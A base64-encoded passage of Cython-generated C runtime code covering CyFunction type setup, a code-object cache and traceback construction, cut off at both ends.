SkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd25hbWVzKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0N5RnVuY3Rpb25UeXBlX3Nsb3RzW10gPSB7XG4gICAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jfSxcbiAgICB7UHlfdHBfcmVwciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3JlcHJ9LFxuICAgIHtQeV90cF9jYWxsLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kfSxcbiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZX0sXG4gICAge1B5X3RwX2NsZWFyLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fY2xlYXJ9LFxuICAgIHtQeV90cF9tZXRob2RzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc30sXG4gICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfQ3lGdW5jdGlvbl9tZW1iZXJzfSxcbiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fZ2V0c2V0c30sXG4gICAge1B5X3RwX2Rlc2NyX2dldCwgKHZvaWQgKilfX1B5eF9QeU1ldGhvZF9OZXd9LFxuICAgIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYyA9IHtcbiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImN5dGhvbl9mdW5jdGlvbl9vcl9tZXRob2QiLFxuICAgIHNpemVvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KSxcbiAgICAwLFxuI2lmZGVmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1JcbiAgICBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SIHxcbiNlbmRpZlxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4jaWYgZGVmaW5lZChQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTClcbiAgICBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8XG4jZWxpZiBkZWZpbmVkKF9QeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTClcbiAgICBfUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwgfFxuI2VuZGlmXG4jZW5kaWYgLy8gQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4gICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHxcbiNlbmRpZlxuICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfQkFTRVRZUEUsXG4gICAgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHNcbn07XG5zdGF0aWMgaW50IF9fcHl4X0N5RnVuY3Rpb25faW5pdChQeU9iamVjdCAqbW9kdWxlKSB7XG4gICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTtcbiAgICBtc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoXG4gICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zcGVjLCBOVUxMKTtcbiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9PSBOVUxMKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdERlZmF1bHRzKFB5T2JqZWN0ICpmdW5jLCBQeVR5cGVPYmplY3QgKmRlZmF1bHRzX3R5cGUpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5kZWZhdWx0cyA9IFB5T2JqZWN0X0NhbGxPYmplY3QoKFB5T2JqZWN0KilkZWZhdWx0c190eXBlLCBOVUxMKTsgLy8gX1B5T2JqZWN0X05ldyhkZWZhdWx0c190eXBlKTtcbiAgICBpZiAodW5saWtlbHkoIW0tPmRlZmF1bHRzKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIG0tPmRlZmF1bHRzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICp0dXBsZSkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzX3R1cGxlID0gdHVwbGU7XG4gICAgUHlfSU5DUkVGKHR1cGxlKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0t3RGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5kZWZhdWx0c19rd2RpY3QgPSBkaWN0O1xuICAgIFB5X0lOQ1JFRihkaWN0KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXRBbm5vdGF0aW9uc0RpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpkaWN0KSB7XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7XG4gICAgbS0+ZnVuY19hbm5vdGF0aW9ucyA9IGRpY3Q7XG4gICAgUHlfSU5DUkVGKGRpY3QpO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9OZXcoUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkge1xuICAgIFB5T2JqZWN0ICpvcCA9IF9fUHl4X0N5RnVuY3Rpb25fSW5pdChcbiAgICAgICAgUHlPYmplY3RfR0NfTmV3KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKSxcbiAgICAgICAgbWwsIGZsYWdzLCBxdWFsbmFtZSwgY2xvc3VyZSwgbW9kdWxlLCBnbG9iYWxzLCBjb2RlXG4gICAgKTtcbiAgICBpZiAobGlrZWx5KG9wKSkge1xuICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhvcCk7XG4gICAgfVxuICAgIHJldHVybiBvcDtcbn1cblxuXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKSB7XG4gICAgUHlPYmplY3QgKnVzZV9jbGluZTtcbiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIFB5T2JqZWN0ICoqY3l0aG9uX3J1bnRpbWVfZGljdDtcbiNlbmRpZlxuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHRzdGF0ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSkpIHtcbiAgICAgICAgcmV0dXJuIGNfbGluZTtcbiAgICB9XG4gICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgY3l0aG9uX3J1bnRpbWVfZGljdCA9IF9QeU9iamVjdF9HZXREaWN0UHRyKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTtcbiAgICBpZiAobGlrZWx5KGN5dGhvbl9ydW50aW1lX2RpY3QpKSB7XG4gICAgICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oKmN5dGhvbl9ydW50aW1lX2RpY3QpO1xuICAgICAgICBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChcbiAgICAgICAgICAgIHVzZV9jbGluZSwgKmN5dGhvbl9ydW50aW1lX2RpY3QsXG4gICAgICAgICAgICBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cigqY3l0aG9uX3J1bnRpbWVfZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaykpXG4gICAgICAgIFB5X1hJTkNSRUYodXNlX2NsaW5lKTtcbiAgICAgICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICp1c2VfY2xpbmVfb2JqID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2spO1xuICAgICAgaWYgKHVzZV9jbGluZV9vYmopIHtcbiAgICAgICAgdXNlX2NsaW5lID0gUHlPYmplY3RfTm90KHVzZV9jbGluZV9vYmopID8gUHlfRmFsc2UgOiBQeV9UcnVlO1xuICAgICAgICBQeV9JTkNSRUYodXNlX2NsaW5lKTtcbiAgICAgICAgUHlfREVDUkVGKHVzZV9jbGluZV9vYmopO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgdXNlX2NsaW5lID0gTlVMTDtcbiAgICAgIH1cbiAgICB9XG4gICAgaWYgKCF1c2VfY2xpbmUpIHtcbiAgICAgICAgY19saW5lID0gMDtcbiAgICAgICAgKHZvaWQpIFB5T2JqZWN0X1NldEF0dHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKTtcbiAgICB9XG4gICAgZWxzZSBpZiAodXNlX2NsaW5lID09IFB5X0ZhbHNlIHx8ICh1c2VfY2xpbmUgIT0gUHlfVHJ1ZSAmJiBQeU9iamVjdF9Ob3QodXNlX2NsaW5lKSAhPSAwKSkge1xuICAgICAgICBjX2xpbmUgPSAwO1xuICAgIH1cbiAgICBQeV9YREVDUkVGKHVzZV9jbGluZSk7XG4gICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTtcbiAgICByZXR1cm4gY19saW5lO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHtcbiAgICBpbnQgc3RhcnQgPSAwLCBtaWQgPSAwLCBlbmQgPSBjb3VudCAtIDE7XG4gICAgaWYgKGVuZCA+PSAwICYmIGNvZGVfbGluZSA+IGVudHJpZXNbZW5kXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIGNvdW50O1xuICAgIH1cbiAgICB3aGlsZSAoc3RhcnQgPCBlbmQpIHtcbiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjtcbiAgICAgICAgaWYgKGNvZGVfbGluZSA8IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgICAgIGVuZCA9IG1pZDtcbiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7XG4gICAgICAgICAgICAgc3RhcnQgPSBtaWQgKyAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIG1pZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAoY29kZV9saW5lIDw9IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIG1pZDtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gbWlkICsgMTtcbiAgICB9XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHtcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7XG4gICAgaW50IHBvcztcbiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpO1xuICAgIGlmICh1bmxpa2VseShwb3MgPj0gY29kZV9jYWNoZS0+Y291bnQpIHx8IHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgIT0gY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgY29kZV9vYmplY3QgPSBjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7XG4gICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTtcbiAgICByZXR1cm4gY29kZV9vYmplY3Q7XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19maW5kX2NvZGVfb2JqZWN0O1xuICAgIHJldHVybiBOVUxMOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGRfY291bnQgPSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCk7XG4gICAgaWYgKG9sZF9jb3VudCA8IDApIHtcbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqcmVzdWx0ID0gX19weXhfX2ZpbmRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTtcbiNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cbnN0YXRpYyB2b2lkIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KVxue1xuICAgIGludCBwb3MsIGk7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMgPSBjb2RlX2NhY2hlLT5lbnRyaWVzO1xuICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fTWFsbG9jKDY0KnNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpO1xuICAgICAgICBpZiAobGlrZWx5KGVudHJpZXMpKSB7XG4gICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPm1heF9jb3VudCA9IDY0O1xuICAgICAgICAgICAgY29kZV9jYWNoZS0+Y291bnQgPSAxO1xuICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgICAgICAgICBlbnRyaWVzWzBdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgICAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTtcbiAgICBpZiAoKHBvcyA8IGNvZGVfY2FjaGUtPmNvdW50KSAmJiB1bmxpa2VseShjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9saW5lID09IGNvZGVfbGluZSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIHRtcCA9IGVudHJpZXNbcG9zXS5jb2RlX29iamVjdDtcbiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmIChjb2RlX2NhY2hlLT5jb3VudCA9PSBjb2RlX2NhY2hlLT5tYXhfY291bnQpIHtcbiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fUmVhbGxvYyhcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMsICgoc2l6ZV90KW5ld19tYXgpICogc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gbmV3X21heDtcbiAgICB9XG4gICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7XG4gICAgICAgIGVudHJpZXNbaV0gPSBlbnRyaWVzW2ktMV07XG4gICAgfVxuICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgY29kZV9jYWNoZS0+Y291bnQrKztcbiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xufVxuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Q7XG4gICAgcmV0dXJuOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBleHBlY3RlZCA9IDA7XG4gICAgaWYgKCFfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsICZleHBlY3RlZCwgSU5UX01JTikpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiNlbmRpZlxuICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBfX3B5eF9hdG9taWNfc3ViKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCwgSU5UX01JTik7XG4jZW5kaWZcbiNlbmRpZlxufVxuXG5cbiNpbmNsdWRlICJjb21waWxlLmgiXG4jaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiNpbmNsdWRlICJ0cmFjZWJhY2suaCJcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZmlyc3RsaW5lbm8sIFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19uYW1lIiwgbmFtZSkpKSByZXR1cm4gTlVMTDtcbiAgICByZXBsYWNlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjb2RlLCAicmVwbGFjZSIpO1xuICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IFB5T2JqZWN0X0NhbGwocmVwbGFjZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIHNjcmF0Y2hfZGljdCk7XG4gICAgICAgIFB5X0RFQ1JFRihyZXBsYWNlKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHtcbiAgICBQeU9iamVjdCAqY29kZV9vYmplY3QgPSBOVUxMLCAqcHlfcHlfbGluZSA9IE5VTEwsICpweV9mdW5jbmFtZSA9IE5VTEwsICpkaWN0ID0gTlVMTDtcbiAgICBQeU9iamVjdCAqcmVwbGFjZSA9IE5VTEwsICpnZXRmcmFtZSA9IE5VTEwsICpmcmFtZSA9IE5VTEw7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjaztcbiAgICBpbnQgc3VjY2VzcyA9IDA7XG4gICAgaWYgKGNfbGluZSkge1xuICAgICAgICAodm9pZCkgX19weXhfY2ZpbGVubTtcbiAgICAgICAgKHZvaWQpIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCwgY19saW5lKTtcbiAgICB9XG4gICAgUHlFcnJfRmV0Y2goJmV4Y190eXBlLCAmZXhjX3ZhbHVlLCAmZXhjX3RyYWNlYmFjayk7XG4gICAgY29kZV9vYmplY3QgPSBfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lKTtcbiAgICBpZiAoIWNvZGVfb2JqZWN0KSB7XG4gICAgICAgIGNvZGVfb2JqZWN0ID0gUHlfQ29tcGlsZVN0cmluZygiX2dldGZyYW1lKCkiLCBmaWxlbmFtZSwgUHlfZXZhbF9pbnB1dCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9vYmplY3QpKSBnb3RvIGJhZDtcbiAgICAgICAgcHlfcHlfbGluZSA9IFB5TG9uZ19Gcm9tTG9uZyhweV9saW5lKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9weV9saW5lKSkgZ290byBiYWQ7XG4gICAgICAgIHB5X2Z1bmNuYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoZnVuY25hbWUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXB5X2Z1bmNuYW1lKSkgZ290byBiYWQ7XG4gICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZGljdCkpIGdvdG8gYm